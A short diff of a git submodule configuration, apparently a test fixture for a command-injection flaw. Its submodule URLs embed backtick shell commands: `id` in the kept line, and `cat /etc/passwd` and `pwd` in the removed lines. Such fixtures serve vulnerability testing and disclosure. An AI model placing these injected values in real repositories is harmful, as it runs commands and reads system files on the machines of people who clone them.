@@ -1,5 +1,3 @@
 [submodule "cves"]
   path = cves
   url = ssh://`id`foo.example.com/bar
-  url = ssh://`cat /etc/passwd`foo.example.com/bar
-  url = salata://`pwd`
